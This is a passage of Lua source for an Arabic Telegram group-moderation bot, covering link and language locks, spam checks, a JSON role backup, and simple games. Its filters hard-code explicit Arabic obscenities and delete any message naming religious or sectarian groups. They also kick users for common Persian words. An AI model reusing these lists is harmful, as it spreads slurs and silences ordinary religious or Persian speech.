DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David..'Abs:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevAbs:get(David..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevAbs:get(David..'Abs:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(David..'Abs:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevAbs:get(David..'Abs:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(David..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(David..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbs:get(David..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevAbs:get(David..'Abs:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevAbs:get(David..'Abs:Spam:Text'..msg.chat_id_))
end
if DevAbs:get(David..'Abs:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(David..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(David.."Abs:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"⌁︙تم الغاء حفظ الرابط")       
DevAbs:del(David.."Abs:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevAbs:set(David.."Abs:Groups:Links"..msg.chat_id_,Link)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرابط بنجاح', 1, 'md')
DevAbs:del(David.."Abs:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevAbs:get('DavidTEAM:'..David.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('DavidTEAM:'..David..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbs:del('DavidTEAM:'..David.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('DavidTEAM:'..David.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('DavidTEAM:'..David..'id:user'..msg.chat_id_)  
DevAbs:incrby(David..'Abs:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Abs(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
DevAbs:del('DavidTEAM:'..David..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevAbs:get('DavidTEAM:'..David.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('DavidTEAM:'..David..'ids:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbs:del('DavidTEAM:'..David.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('DavidTEAM:'..David.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('DavidTEAM:'..David..'ids:user'..msg.chat_id_)  
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevAbs:del('DavidTEAM:'..David..'ids:user'..msg.chat_id_)  
end
end
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevAbs:get(David.."Abs:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbs:get(David.."Abs:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbs:get(David.."Abs:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevAbs:get(David.."Abs:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevAbs:get(David.."Abs:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالطائفيه هنا") 
end end
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' and ChCheck(msg) or text == 'جلب نسخه احتياطيه' and ChCheck(msg) then
local List = DevAbs:smembers(David..'Abs:Groups') 
local BotName = (DevAbs:get(David.."Abs:NameBot") or 'ديفد')
local GetJson = '{"BotId": '..David..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevAbs:get(David.."Abs:Groups:Links"..v)
Welcomes = DevAbs:get(David..'Abs:Groups:Welcomes'..v) or ''
AbsConstructors = DevAbs:smembers(David..'Abs:AbsConstructor:'..v)
Constructors = DevAbs:smembers(David..'Abs:BasicConstructor:'..v)
BasicConstructors = DevAbs:smembers(David..'Abs:Constructor:'..v)
Managers = DevAbs:smembers(David..'Abs:Managers:'..v)
Admis = DevAbs:smembers(David..'Abs:Admins:'..v)
Vips = DevAbs:smembers(David..'Abs:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #AbsConstructors ~= 0 then
GetJson = GetJson..'"AbsConstructors":['
for k,v in pairs(AbsConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..David..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..David..'.json', '⌁︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..David..'.json')
end
if text == 'رفع النسخه' and tonumber(msg.reply_to_message_id_) > 0 or text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if DevAbs:get(David.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(David.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(David.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAbs:incrby(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(David.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevAbs:get(David..'DevAbs4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⌁︙تم الغاء الامر")
DevAbs:del(David..'DevAbs4'..msg.sender_user_id_)
return false  end 
DevAbs:del(David..'DevAbs4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '⌁︙المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '⌁︙عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '⌁︙عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'⌁︙البوت ادمن في القناة \n⌁︙تم تفعيل الاشتراك الاجباري \n⌁︙ايدي القناة ↫ '..data.id_..'\n⌁︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
DevAbs:set(David..'DevAbs2',data.id_)
DevAbs:set(David..'DevAbs3','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'⌁︙عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
if DevAbs:get(David.."Abs:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevAbs:del(David.."Abs:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
return false 
end 
DevAbs:del(David.."Abs:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbs:set(David.."DevText", DevText)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
end
if DevAbs:get(David..'Abs:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevAbs:del(David..'Abs:NameBot'..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
DevAbs:del(David..'Abs:NameBot'..msg.sender_user_id_)
DevAbs:set(David..'Abs:NameBot', text)
return false 
end
if text == "الرابط" then
if not DevAbs:get(David.."Abs:Lock:GpLinks"..msg.chat_id_) then 
if DevAbs:get(David.."Abs:Groups:Links"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevAbs:get(David.."Abs:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙جلب رابط المجموعه معطل', 1, 'md')
end
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'ديفد')
local DavidTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
DevAbs2 = math.random(#DavidTEAM) 
Dev_Abs(msg.chat_id_, msg.id_, 1, DavidTEAM[DevAbs2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'ديفد') 
local DavidTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
DevAbs2 = math.random(#DavidTEAM) 
Dev_Abs(msg.chat_id_, msg.id_, 1, DavidTEAM[DevAbs2] , 1, 'html') 
return false
end
if text and text == (DevAbs:get(David..'Abs:NameBot') or 'ديفد') then 
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'ديفد')
local namebot = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
name = math.random(#namebot) 
Dev_Abs(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevAbs:get(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAbs:del(David..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevAbs:del(David..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if not DevAbs:get(David..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(David..'Abs:GameNum'..msg.chat_id_,name)
DevAbs:del(David..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
